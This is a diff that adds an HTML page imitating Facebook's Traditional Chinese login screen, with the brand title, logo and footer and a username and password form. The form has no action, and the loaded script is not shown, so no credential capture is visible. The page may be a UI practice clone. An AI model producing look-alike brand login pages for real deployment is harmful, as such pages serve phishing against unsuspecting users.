@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>登入Facebook</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+<div class="Top">
+    <a href="https://www.facebook.com/"><img src="dF5SId3UHWd.svg" style="height: 100px"></a>
+</div>
+<div class="Login">
+    <div id="loginForm">
+        <div id="head">
+            <p>登入 Facebook</p>
+        </div>
+        <form id="login">
+            <div id="account">
+                <input type="text" class="form-control" name="userid" placeholder="電子郵件地址或手機號碼" autocomplete="phone-number" required pattern="^[A-Za-z][A-Za-z0-9]{1,11}$" maxlength="12">
+            </div>
+            <div id="password">
+                <input type="password" spellcheck="false" class="form-control" name="password" placeholder="密碼" autocomplete="current-password" required maxlength="22">
+                <span onclick="passwordChangeType()">
+                    <i id="eye" class="material-icons">visibility</i>
+                </span>
+            </div>
+            <div id="option">
+                <ul class="check-box"></ul>
+                <div id="login-box"><a id="btn-login" href="https://www.facebook.com/">登入</a></div>
+            </div>
+        </form>
+
+        <div class="forget-account">
+            <a href="https://www.facebook.com/">忘記帳號？</a>
+        </div>
+        <div class="other-option">
+            <hr>
+            <div class="or">或</div>
+            <hr>
+        </div>
+        <div>
+            <a id="create" href="https://www.facebook.com/">建立新帳號</a>
+        </div>
+    </div>
+    <div id="bottom">
+        <p>
+            中文(台灣)  English (US)  Tiếng Việt  Bahasa Indonesia  ภาษาไทย  日本語  Español  Português (Brasil)  Français (France)  Deutsch  Italiano
+            <br>
+            註冊  登入  Messenger  Facebook Lite  Watch  地標  遊戲  Marketplace  Meta Pay  Meta Store  Meta Quest  Instagram  Bulletin  募款活動
+            <br>
+            服務 投票資訊中心  《隱私政策》  隱私中心  社團  關於  刊登  廣告  建立粉絲專頁  開發人員  工作機會  CookieAd Choices  使用條款
+            <br>
+            使用說明  聯絡人上傳和非用戶  設定活動紀錄
+            <br>
+            Meta © 2023
+        </p>
+    </div>
+</div>
+<script src="main.js"></script>
+</body>
+</html>
